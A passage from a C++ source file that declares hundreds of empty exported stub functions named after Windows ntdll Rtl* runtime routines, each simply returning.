extern "C" { __declspec(dllexport) void RtlDosPathNameToRelativeNtPathName_U() { return; } }
extern "C" { __declspec(dllexport) void RtlDosPathNameToRelativeNtPathName_U_WithStatus() { return; } }
extern "C" { __declspec(dllexport) void RtlDosSearchPath_U() { return; } }
extern "C" { __declspec(dllexport) void RtlDosSearchPath_Ustr() { return; } }
extern "C" { __declspec(dllexport) void RtlDowncaseUnicodeChar() { return; } }
extern "C" { __declspec(dllexport) void RtlDowncaseUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlDumpResource() { return; } }
extern "C" { __declspec(dllexport) void RtlDuplicateUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlEmptyAtomTable() { return; } }
extern "C" { __declspec(dllexport) void RtlEnableEarlyCriticalSectionEventCreation() { return; } }
extern "C" { __declspec(dllexport) void RtlEnableThreadProfiling() { return; } }
extern "C" { __declspec(dllexport) void RtlEncodePointer() { return; } }
extern "C" { __declspec(dllexport) void RtlEncodeSystemPointer() { return; } }
extern "C" { __declspec(dllexport) void RtlEndEnumerationHashTable() { return; } }
extern "C" { __declspec(dllexport) void RtlEndWeakEnumerationHashTable() { return; } }
extern "C" { __declspec(dllexport) void RtlEnterCriticalSection() { return; } }
extern "C" { __declspec(dllexport) void RtlEnterUmsSchedulingMode() { return; } }
extern "C" { __declspec(dllexport) void RtlEnumProcessHeaps() { return; } }
extern "C" { __declspec(dllexport) void RtlEnumerateEntryHashTable() { return; } }
extern "C" { __declspec(dllexport) void RtlEnumerateGenericTable() { return; } }
extern "C" { __declspec(dllexport) void RtlEnumerateGenericTableAvl() { return; } }
extern "C" { __declspec(dllexport) void RtlEnumerateGenericTableLikeADirectory() { return; } }
extern "C" { __declspec(dllexport) void RtlEnumerateGenericTableWithoutSplaying() { return; } }
extern "C" { __declspec(dllexport) void RtlEnumerateGenericTableWithoutSplayingAvl() { return; } }
extern "C" { __declspec(dllexport) void RtlEqualComputerName() { return; } }
extern "C" { __declspec(dllexport) void RtlEqualDomainName() { return; } }
extern "C" { __declspec(dllexport) void RtlEqualLuid() { return; } }
extern "C" { __declspec(dllexport) void RtlEqualPrefixSid() { return; } }
extern "C" { __declspec(dllexport) void RtlEqualSid() { return; } }
extern "C" { __declspec(dllexport) void RtlEqualString() { return; } }
extern "C" { __declspec(dllexport) void RtlEqualUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlEqualWnfChangeStamps() { return; } }
extern "C" { __declspec(dllexport) void RtlEraseUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlEthernetAddressToStringA() { return; } }
extern "C" { __declspec(dllexport) void RtlEthernetAddressToStringW() { return; } }
extern "C" { __declspec(dllexport) void RtlEthernetStringToAddressA() { return; } }
extern "C" { __declspec(dllexport) void RtlEthernetStringToAddressW() { return; } }
extern "C" { __declspec(dllexport) void RtlExecuteUmsThread() { return; } }
extern "C" { __declspec(dllexport) void RtlExitUserProcess() { return; } }
extern "C" { __declspec(dllexport) void RtlExitUserThread() { return; } }
extern "C" { __declspec(dllexport) void RtlExpandEnvironmentStrings() { return; } }
extern "C" { __declspec(dllexport) void RtlExpandEnvironmentStrings_U() { return; } }
extern "C" { __declspec(dllexport) void RtlExpandHashTable() { return; } }
extern "C" { __declspec(dllexport) void RtlExtendMemoryBlockLookaside() { return; } }
extern "C" { __declspec(dllexport) void RtlExtendMemoryZone() { return; } }
extern "C" { __declspec(dllexport) void RtlExtractBitMap() { return; } }
extern "C" { __declspec(dllexport) void RtlFinalReleaseOutOfProcessMemoryStream() { return; } }
extern "C" { __declspec(dllexport) void RtlFindAceByType() { return; } }
extern "C" { __declspec(dllexport) void RtlFindActivationContextSectionGuid() { return; } }
extern "C" { __declspec(dllexport) void RtlFindActivationContextSectionString() { return; } }
extern "C" { __declspec(dllexport) void RtlFindCharInUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlFindClearBits() { return; } }
extern "C" { __declspec(dllexport) void RtlFindClearBitsAndSet() { return; } }
extern "C" { __declspec(dllexport) void RtlFindClearRuns() { return; } }
extern "C" { __declspec(dllexport) void RtlFindClosestEncodableLength() { return; } }
extern "C" { __declspec(dllexport) void RtlFindLastBackwardRunClear() { return; } }
extern "C" { __declspec(dllexport) void RtlFindLeastSignificantBit() { return; } }
extern "C" { __declspec(dllexport) void RtlFindLongestRunClear() { return; } }
extern "C" { __declspec(dllexport) void RtlFindMessage() { return; } }
extern "C" { __declspec(dllexport) void RtlFindMostSignificantBit() { return; } }
extern "C" { __declspec(dllexport) void RtlFindNextForwardRunClear() { return; } }
extern "C" { __declspec(dllexport) void RtlFindSetBits() { return; } }
extern "C" { __declspec(dllexport) void RtlFindSetBitsAndClear() { return; } }
extern "C" { __declspec(dllexport) void RtlFirstFreeAce() { return; } }
extern "C" { __declspec(dllexport) void RtlFlsAlloc() { return; } }
extern "C" { __declspec(dllexport) void RtlFlsFree() { return; } }
extern "C" { __declspec(dllexport) void RtlFlushHeaps() { return; } }
extern "C" { __declspec(dllexport) void RtlFlushSecureMemoryCache() { return; } }
extern "C" { __declspec(dllexport) void RtlFormatCurrentUserKeyPath() { return; } }
extern "C" { __declspec(dllexport) void RtlFormatMessage() { return; } }
extern "C" { __declspec(dllexport) void RtlFormatMessageEx() { return; } }
extern "C" { __declspec(dllexport) void RtlFreeActivationContextStack() { return; } }
extern "C" { __declspec(dllexport) void RtlFreeAnsiString() { return; } }
extern "C" { __declspec(dllexport) void RtlFreeHandle() { return; } }
extern "C" { __declspec(dllexport) void RtlFreeHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlFreeMemoryBlockLookaside() { return; } }
extern "C" { __declspec(dllexport) void RtlFreeOemString() { return; } }
extern "C" { __declspec(dllexport) void RtlFreeSid() { return; } }
extern "C" { __declspec(dllexport) void RtlFreeThreadActivationContextStack() { return; } }
extern "C" { __declspec(dllexport) void RtlFreeUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlFreeUserStack() { return; } }
extern "C" { __declspec(dllexport) void RtlGUIDFromString() { return; } }
extern "C" { __declspec(dllexport) void RtlGenerate8dot3Name() { return; } }
extern "C" { __declspec(dllexport) void RtlGetAce() { return; } }
extern "C" { __declspec(dllexport) void RtlGetActiveActivationContext() { return; } }
extern "C" { __declspec(dllexport) void RtlGetAppContainerNamedObjectPath() { return; } }
extern "C" { __declspec(dllexport) void RtlGetCallersAddress() { return; } }
extern "C" { __declspec(dllexport) void RtlGetCompressionWorkSpaceSize() { return; } }
extern "C" { __declspec(dllexport) void RtlGetControlSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlGetCriticalSectionRecursionCount() { return; } }
extern "C" { __declspec(dllexport) void RtlGetCurrentDirectory_U() { return; } }
extern "C" { __declspec(dllexport) void RtlGetCurrentPeb() { return; } }
extern "C" { __declspec(dllexport) void RtlGetCurrentProcessorNumber() { return; } }
extern "C" { __declspec(dllexport) void RtlGetCurrentProcessorNumberEx() { return; } }
extern "C" { __declspec(dllexport) void RtlGetCurrentTransaction() { return; } }
extern "C" { __declspec(dllexport) void RtlGetCurrentUmsThread() { return; } }
extern "C" { __declspec(dllexport) void RtlGetDaclSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlGetElementGenericTable() { return; } }
extern "C" { __declspec(dllexport) void RtlGetElementGenericTableAvl() { return; } }
extern "C" { __declspec(dllexport) void RtlGetEnabledExtendedFeatures() { return; } }
extern "C" { __declspec(dllexport) void RtlGetExePath() { return; } }
extern "C" { __declspec(dllexport) void RtlGetExtendedContextLength() { return; } }
extern "C" { __declspec(dllexport) void RtlGetExtendedFeaturesMask() { return; } }
extern "C" { __declspec(dllexport) void RtlGetFileMUIPath() { return; } }
extern "C" { __declspec(dllexport) void RtlGetFrame() { return; } }
extern "C" { __declspec(dllexport) void RtlGetFullPathName_U() { return; } }
extern "C" { __declspec(dllexport) void RtlGetFullPathName_UEx() { return; } }
extern "C" { __declspec(dllexport) void RtlGetFullPathName_UstrEx() { return; } }
extern "C" { __declspec(dllexport) void RtlGetFunctionTableListHead() { return; } }
extern "C" { __declspec(dllexport) void RtlGetGroupSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlGetIntegerAtom() { return; } }
extern "C" { __declspec(dllexport) void RtlGetLastNtStatus() { return; } }
extern "C" { __declspec(dllexport) void RtlGetLastWin32Error() { return; } }
extern "C" { __declspec(dllexport) void RtlGetLengthWithoutLastFullDosOrNtPathElement() { return; } }
extern "C" { __declspec(dllexport) void RtlGetLengthWithoutTrailingPathSeperators() { return; } }
extern "C" { __declspec(dllexport) void RtlGetLocaleFileMappingAddress() { return; } }
extern "C" { __declspec(dllexport) void RtlGetLongestNtPathLength() { return; } }
extern "C" { __declspec(dllexport) void RtlGetNativeSystemInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlGetNextEntryHashTable() { return; } }
extern "C" { __declspec(dllexport) void RtlGetNextUmsListItem() { return; } }
extern "C" { __declspec(dllexport) void RtlGetNtGlobalFlags() { return; } }
extern "C" { __declspec(dllexport) void RtlGetNtProductType() { return; } }
extern "C" { __declspec(dllexport) void RtlGetNtVersionNumbers() { return; } }
extern "C" { __declspec(dllexport) void RtlGetOwnerSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlGetParentLocaleName() { return; } }
extern "C" { __declspec(dllexport) void RtlGetProcessHeaps() { return; } }
extern "C" { __declspec(dllexport) void RtlGetProcessPreferredUILanguages() { return; } }
extern "C" { __declspec(dllexport) void RtlGetSaclSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlGetSearchPath() { return; } }
extern "C" { __declspec(dllexport) void RtlGetSecurityDescriptorRMControl() { return; } }
extern "C" { __declspec(dllexport) void RtlGetSetBootStatusData() { return; } }
extern "C" { __declspec(dllexport) void RtlGetSystemPreferredUILanguages() { return; } }
extern "C" { __declspec(dllexport) void RtlGetSystemTimePrecise() { return; } }
extern "C" { __declspec(dllexport) void RtlGetThreadErrorMode() { return; } }
extern "C" { __declspec(dllexport) void RtlGetThreadLangIdByIndex() { return; } }
extern "C" { __declspec(dllexport) void RtlGetThreadPreferredUILanguages() { return; } }
extern "C" { __declspec(dllexport) void RtlGetUILanguageInfo() { return; } }
extern "C" { __declspec(dllexport) void RtlGetUmsCompletionListEvent() { return; } }
extern "C" { __declspec(dllexport) void RtlGetUnloadEventTrace() { return; } }
extern "C" { __declspec(dllexport) void RtlGetUnloadEventTraceEx() { return; } }
extern "C" { __declspec(dllexport) void RtlGetUserInfoHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlGetUserPreferredUILanguages() { return; } }
extern "C" { __declspec(dllexport) void RtlGetVersion() { return; } }
extern "C" { __declspec(dllexport) void RtlHashUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlHeapTrkInitialize() { return; } }
extern "C" { __declspec(dllexport) void RtlIdentifierAuthoritySid() { return; } }
extern "C" { __declspec(dllexport) void RtlIdnToAscii() { return; } }
extern "C" { __declspec(dllexport) void RtlIdnToNameprepUnicode() { return; } }
extern "C" { __declspec(dllexport) void RtlIdnToUnicode() { return; } }
extern "C" { __declspec(dllexport) void RtlImageDirectoryEntryToData() { return; } }
extern "C" { __declspec(dllexport) void RtlImageNtHeader() { return; } }
extern "C" { __declspec(dllexport) void RtlImageNtHeaderEx() { return; } }
extern "C" { __declspec(dllexport) void RtlImageRvaToSection() { return; } }
extern "C" { __declspec(dllexport) void RtlImageRvaToVa() { return; } }
extern "C" { __declspec(dllexport) void RtlImpersonateSelf() { return; } }
extern "C" { __declspec(dllexport) void RtlImpersonateSelfEx() { return; } }
extern "C" { __declspec(dllexport) void RtlInitAnsiString() { return; } }
extern "C" { __declspec(dllexport) void RtlInitAnsiStringEx() { return; } }
extern "C" { __declspec(dllexport) void RtlInitBarrier() { return; } }
extern "C" { __declspec(dllexport) void RtlInitCodePageTable() { return; } }
extern "C" { __declspec(dllexport) void RtlInitEnumerationHashTable() { return; } }
extern "C" { __declspec(dllexport) void RtlInitMemoryStream() { return; } }
extern "C" { __declspec(dllexport) void RtlInitNlsTables() { return; } }
extern "C" { __declspec(dllexport) void RtlInitOutOfProcessMemoryStream() { return; } }
extern "C" { __declspec(dllexport) void RtlInitString() { return; } }
extern "C" { __declspec(dllexport) void RtlInitUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlInitUnicodeStringEx() { return; } }
extern "C" { __declspec(dllexport) void RtlInitWeakEnumerationHashTable() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeAtomPackage() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeBitMap() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeConditionVariable() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeContext() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeCriticalSection() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeCriticalSectionAndSpinCount() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeCriticalSectionEx() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeExtendedContext() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeGenericTable() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeGenericTableAvl() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeHandleTable() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeNtUserPfn() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeRXact() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeResource() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeSRWLock() { return; } }
extern "C" { __declspec(dllexport) void RtlInitializeSid() { return; } }
extern "C" { __declspec(dllexport) void RtlInsertElementGenericTable() { return; } }
extern "C" { __declspec(dllexport) void RtlInsertElementGenericTableAvl() { return; } }
extern "C" { __declspec(dllexport) void RtlInsertElementGenericTableFull() { return; } }
extern "C" { __declspec(dllexport) void RtlInsertElementGenericTableFullAvl() { return; } }
extern "C" { __declspec(dllexport) void RtlInt64ToUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlIntegerToChar() { return; } }
extern "C" { __declspec(dllexport) void RtlIntegerToUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlInterlockedClearBitRun() { return; } }
extern "C" { __declspec(dllexport) void RtlInterlockedSetBitRun() { return; } }
extern "C" { __declspec(dllexport) void RtlIoDecodeMemIoResource() { return; } }
extern "C" { __declspec(dllexport) void RtlIoEncodeMemIoResource() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv4AddressToStringA() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv4AddressToStringExA() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv4AddressToStringExW() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv4AddressToStringW() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv4StringToAddressA() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv4StringToAddressExA() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv4StringToAddressExW() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv4StringToAddressW() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv6AddressToStringA() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv6AddressToStringExA() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv6AddressToStringExW() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv6AddressToStringW() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv6StringToAddressA() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv6StringToAddressExA() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv6StringToAddressExW() { return; } }
extern "C" { __declspec(dllexport) void RtlIpv6StringToAddressW() { return; } }
extern "C" { __declspec(dllexport) void RtlIsActivationContextActive() { return; } }
extern "C" { __declspec(dllexport) void RtlIsCapabilitySid() { return; } }
extern "C" { __declspec(dllexport) void RtlIsCriticalSectionLocked() { return; } }
extern "C" { __declspec(dllexport) void RtlIsCriticalSectionLockedByThread() { return; } }
extern "C" { __declspec(dllexport) void RtlIsCurrentThreadAttachExempt() { return; } }
extern "C" { __declspec(dllexport) void RtlIsDosDeviceName_U() { return; } }
extern "C" { __declspec(dllexport) void RtlIsGenericTableEmpty() { return; } }
extern "C" { __declspec(dllexport) void RtlIsGenericTableEmptyAvl() { return; } }
extern "C" { __declspec(dllexport) void RtlIsNameInExpression() { return; } }
extern "C" { __declspec(dllexport) void RtlIsNameLegalDOS8Dot3() { return; } }
extern "C" { __declspec(dllexport) void RtlIsNormalizedString() { return; } }
extern "C" { __declspec(dllexport) void RtlIsPackageSid() { return; } }
extern "C" { __declspec(dllexport) void RtlIsTextUnicode() { return; } }
extern "C" { __declspec(dllexport) void RtlIsThreadWithinLoaderCallout() { return; } }
extern "C" { __declspec(dllexport) void RtlIsUntrustedObject() { return; } }
extern "C" { __declspec(dllexport) void RtlIsValidHandle() { return; } }
extern "C" { __declspec(dllexport) void RtlIsValidIndexHandle() { return; } }
extern "C" { __declspec(dllexport) void RtlIsValidLocaleName() { return; } }
extern "C" { __declspec(dllexport) void RtlKnownExceptionFilter() { return; } }
extern "C" { __declspec(dllexport) void RtlLCIDToCultureName() { return; } }
extern "C" { __declspec(dllexport) void RtlLargeIntegerToChar() { return; } }
extern "C" { __declspec(dllexport) void RtlLcidToLocaleName() { return; } }
extern "C" { __declspec(dllexport) void RtlLeaveCriticalSection() { return; } }
extern "C" { __declspec(dllexport) void RtlLengthRequiredSid() { return; } }
extern "C" { __declspec(dllexport) void RtlLengthSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlLengthSid() { return; } }
extern "C" { __declspec(dllexport) void RtlLengthSidAsUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlLoadString() { return; } }
extern "C" { __declspec(dllexport) void RtlLocalTimeToSystemTime() { return; } }
extern "C" { __declspec(dllexport) void RtlLocaleNameToLcid() { return; } }
extern "C" { __declspec(dllexport) void RtlLocateExtendedFeature() { return; } }
extern "C" { __declspec(dllexport) void RtlLocateLegacyContext() { return; } }
extern "C" { __declspec(dllexport) void RtlLockBootStatusData() { return; } }
extern "C" { __declspec(dllexport) void RtlLockCurrentThread() { return; } }
extern "C" { __declspec(dllexport) void RtlLockHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlLockMemoryBlockLookaside() { return; } }
extern "C" { __declspec(dllexport) void RtlLockMemoryStreamRegion() { return; } }
extern "C" { __declspec(dllexport) void RtlLockMemoryZone() { return; } }
extern "C" { __declspec(dllexport) void RtlLockModuleSection() { return; } }
extern "C" { __declspec(dllexport) void RtlLogStackBackTrace() { return; } }
extern "C" { __declspec(dllexport) void RtlLookupAtomInAtomTable() { return; } }
extern "C" { __declspec(dllexport) void RtlLookupElementGenericTable() { return; } }
extern "C" { __declspec(dllexport) void RtlLookupElementGenericTableAvl() { return; } }
extern "C" { __declspec(dllexport) void RtlLookupElementGenericTableFull() { return; } }
extern "C" { __declspec(dllexport) void RtlLookupElementGenericTableFullAvl() { return; } }
extern "C" { __declspec(dllexport) void RtlLookupEntryHashTable() { return; } }
extern "C" { __declspec(dllexport) void RtlLookupFunctionTable() { return; } }
extern "C" { __declspec(dllexport) void RtlMakeSelfRelativeSD() { return; } }
extern "C" { __declspec(dllexport) void RtlMapGenericMask() { return; } }
extern "C" { __declspec(dllexport) void RtlMapSecurityErrorToNtStatus() { return; } }
extern "C" { __declspec(dllexport) void RtlMultiAppendUnicodeStringBuffer() { return; } }
extern "C" { __declspec(dllexport) void RtlMultiByteToUnicodeN() { return; } }
extern "C" { __declspec(dllexport) void RtlMultiByteToUnicodeSize() { return; } }
extern "C" { __declspec(dllexport) void RtlMultipleAllocateHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlMultipleFreeHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlNewInstanceSecurityObject() { return; } }
extern "C" { __declspec(dllexport) void RtlNewSecurityGrantedAccess() { return; } }
extern "C" { __declspec(dllexport) void RtlNewSecurityObject() { return; } }
extern "C" { __declspec(dllexport) void RtlNewSecurityObjectEx() { return; } }
extern "C" { __declspec(dllexport) void RtlNewSecurityObjectWithMultipleInheritance() { return; } }
extern "C" { __declspec(dllexport) void RtlNormalizeProcessParams() { return; } }
extern "C" { __declspec(dllexport) void RtlNormalizeString() { return; } }
extern "C" { __declspec(dllexport) void RtlNtPathNameToDosPathName() { return; } }
extern "C" { __declspec(dllexport) void RtlNtStatusToDosError() { return; } }
extern "C" { __declspec(dllexport) void RtlNtStatusToDosErrorNoTeb() { return; } }
extern "C" { __declspec(dllexport) void RtlNtdllName() { return; } }
extern "C" { __declspec(dllexport) void RtlNumberGenericTableElements() { return; } }
extern "C" { __declspec(dllexport) void RtlNumberGenericTableElementsAvl() { return; } }
extern "C" { __declspec(dllexport) void RtlNumberOfClearBits() { return; } }
extern "C" { __declspec(dllexport) void RtlNumberOfClearBitsInRange() { return; } }
extern "C" { __declspec(dllexport) void RtlNumberOfSetBits() { return; } }
extern "C" { __declspec(dllexport) void RtlNumberOfSetBitsInRange() { return; } }
extern "C" { __declspec(dllexport) void RtlNumberOfSetBitsUlongPtr() { return; } }
extern "C" { __declspec(dllexport) void RtlOemStringToUnicodeSize() { return; } }
extern "C" { __declspec(dllexport) void RtlOemStringToUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlOemToUnicodeN() { return; } }
extern "C" { __declspec(dllexport) void RtlOpenCurrentUser() { return; } }
extern "C" { __declspec(dllexport) void RtlOwnerAcesPresent() { return; } }
extern "C" { __declspec(dllexport) void RtlPinAtomInAtomTable() { return; } }
extern "C" { __declspec(dllexport) void RtlPopFrame() { return; } }
extern "C" { __declspec(dllexport) void RtlPrefixString() { return; } }
extern "C" { __declspec(dllexport) void RtlPrefixUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlPrepareForProcessCloning() { return; } }
extern "C" { __declspec(dllexport) void RtlProcessFlsData() { return; } }
extern "C" { __declspec(dllexport) void RtlProtectHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlPublishWnfStateData() { return; } }
extern "C" { __declspec(dllexport) void RtlPushFrame() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryActivationContextApplicationSettings() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryAtomInAtomTable() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryCriticalSectionOwner() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryDynamicTimeZoneInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryElevationFlags() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryEnvironmentVariable() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryEnvironmentVariable_U() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryHeapInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryInformationAcl() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryInformationActivationContext() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryInformationActiveActivationContext() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryInterfaceMemoryStream() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryModuleInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryPackageIdentity() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryPerformanceCounter() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryPerformanceFrequency() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryProcessBackTraceInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryProcessDebugInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryProcessHeapInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryProcessLockInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryRegistryValues() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryRegistryValuesEx() { return; } }
extern "C" { __declspec(dllexport) void RtlQuerySecurityObject() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryTagHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryThreadProfiling() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryTimeZoneInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryUmsThreadInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryUnbiasedInterruptTime() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryValidationRunlevel() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryWnfMetaNotification() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryWnfStateData() { return; } }
extern "C" { __declspec(dllexport) void RtlQueryWnfStateDataWithExplicitScope() { return; } }
extern "C" { __declspec(dllexport) void RtlQueueApcWow64Thread() { return; } }
extern "C" { __declspec(dllexport) void RtlQueueWorkItem() { return; } }
extern "C" { __declspec(dllexport) void RtlRaiseException() { return; } }
extern "C" { __declspec(dllexport) void RtlRaiseStatus() { return; } }
extern "C" { __declspec(dllexport) void RtlRandom() { return; } }
extern "C" { __declspec(dllexport) void RtlRandomEx() { return; } }
extern "C" { __declspec(dllexport) void RtlRbInsertNodeEx() { return; } }
extern "C" { __declspec(dllexport) void RtlRbRemoveNode() { return; } }
extern "C" { __declspec(dllexport) void RtlReAllocateHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlReadMemoryStream() { return; } }
extern "C" { __declspec(dllexport) void RtlReadOutOfProcessMemoryStream() { return; } }
extern "C" { __declspec(dllexport) void RtlReadThreadProfilingData() { return; } }
extern "C" { __declspec(dllexport) void RtlRealPredecessor() { return; } }
extern "C" { __declspec(dllexport) void RtlRealSuccessor() { return; } }
extern "C" { __declspec(dllexport) void RtlRegisterForWnfMetaNotification() { return; } }
extern "C" { __declspec(dllexport) void RtlRegisterSecureMemoryCacheCallback() { return; } }
extern "C" { __declspec(dllexport) void RtlRegisterThreadWithCsrss() { return; } }
extern "C" { __declspec(dllexport) void RtlRegisterWait() { return; } }
extern "C" { __declspec(dllexport) void RtlReleaseActivationContext() { return; } }
extern "C" { __declspec(dllexport) void RtlReleaseMemoryStream() { return; } }
extern "C" { __declspec(dllexport) void RtlReleasePath() { return; } }
extern "C" { __declspec(dllexport) void RtlReleasePebLock() { return; } }
extern "C" { __declspec(dllexport) void RtlReleasePrivilege() { return; } }
extern "C" { __declspec(dllexport) void RtlReleaseRelativeName() { return; } }
extern "C" { __declspec(dllexport) void RtlReleaseResource() { return; } }
extern "C" { __declspec(dllexport) void RtlReleaseSRWLockExclusive() { return; } }
extern "C" { __declspec(dllexport) void RtlReleaseSRWLockShared() { return; } }
extern "C" { __declspec(dllexport) void RtlRemoteCall() { return; } }
extern "C" { __declspec(dllexport) void RtlRemoveEntryHashTable() { return; } }
extern "C" { __declspec(dllexport) void RtlRemovePrivileges() { return; } }
extern "C" { __declspec(dllexport) void RtlRemoveVectoredContinueHandler() { return; } }
extern "C" { __declspec(dllexport) void RtlRemoveVectoredExceptionHandler() { return; } }
extern "C" { __declspec(dllexport) void RtlReplaceSidInSd() { return; } }
extern "C" { __declspec(dllexport) void RtlReportException() { return; } }
extern "C" { __declspec(dllexport) void RtlReportSilentProcessExit() { return; } }
extern "C" { __declspec(dllexport) void RtlReportSqmEscalation() { return; } }
extern "C" { __declspec(dllexport) void RtlResetMemoryBlockLookaside() { return; } }
extern "C" { __declspec(dllexport) void RtlResetMemoryZone() { return; } }
extern "C" { __declspec(dllexport) void RtlResetNtUserPfn() { return; } }
extern "C" { __declspec(dllexport) void RtlResetRtlTranslations() { return; } }
extern "C" { __declspec(dllexport) void RtlRestoreLastWin32Error() { return; } }
extern "C" { __declspec(dllexport) void RtlRetrieveNtUserPfn() { return; } }
extern "C" { __declspec(dllexport) void RtlRevertMemoryStream() { return; } }
extern "C" { __declspec(dllexport) void RtlRunDecodeUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlRunEncodeUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlRunOnceBeginInitialize() { return; } }
extern "C" { __declspec(dllexport) void RtlRunOnceComplete() { return; } }
extern "C" { __declspec(dllexport) void RtlRunOnceExecuteOnce() { return; } }
extern "C" { __declspec(dllexport) void RtlRunOnceInitialize() { return; } }
extern "C" { __declspec(dllexport) void RtlSecondsSince1970ToTime() { return; } }
extern "C" { __declspec(dllexport) void RtlSecondsSince1980ToTime() { return; } }
extern "C" { __declspec(dllexport) void RtlSeekMemoryStream() { return; } }
extern "C" { __declspec(dllexport) void RtlSelfRelativeToAbsoluteSD() { return; } }
extern "C" { __declspec(dllexport) void RtlSelfRelativeToAbsoluteSD2() { return; } }
extern "C" { __declspec(dllexport) void RtlSendMsgToSm() { return; } }
extern "C" { __declspec(dllexport) void RtlSetAllBits() { return; } }
extern "C" { __declspec(dllexport) void RtlSetAttributesSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlSetBit() { return; } }
extern "C" { __declspec(dllexport) void RtlSetBits() { return; } }
extern "C" { __declspec(dllexport) void RtlSetControlSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlSetCriticalSectionSpinCount() { return; } }
extern "C" { __declspec(dllexport) void RtlSetCurrentDirectory_U() { return; } }
extern "C" { __declspec(dllexport) void RtlSetCurrentEnvironment() { return; } }
extern "C" { __declspec(dllexport) void RtlSetCurrentTransaction() { return; } }
extern "C" { __declspec(dllexport) void RtlSetDaclSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlSetDynamicTimeZoneInformation() { return; } }
extern "C" { __declspec(dllexport) void RtlSetEnvironmentStrings() { return; } }
extern "C" { __declspec(dllexport) void RtlSetEnvironmentVar() { return; } }
extern "C" { __declspec(dllexport) void RtlSetEnvironmentVariable() { return; } }
extern "C" { __declspec(dllexport) void RtlSetExtendedFeaturesMask() { return; } }
